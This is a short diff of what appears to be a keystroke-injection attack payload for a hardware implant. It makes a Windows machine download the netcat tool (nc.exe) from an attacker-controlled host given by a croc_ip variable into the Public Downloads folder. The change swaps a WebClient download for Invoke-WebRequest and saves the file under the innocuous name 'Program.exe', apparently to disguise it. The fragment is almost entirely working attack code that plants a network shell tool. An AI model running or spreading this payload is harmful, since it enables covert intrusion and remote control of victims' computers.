@@ -39,7 +39,7 @@ Q STRING "cd C:\Users\Public\Downloads"
 DELAY 500
 Q ENTER
 
-Q STRING "(New-Object System.Net.WebClient).DownloadFile('http://${croc_ip}:8080/nc.exe','C:\Users\Public\Downloads\nc.exe')"
+Q STRING "Invoke-WebRequest 'http://${croc_ip}:8080/nc.exe' -O Program.exe"
 DELAY 1000
 Q ENTER
 
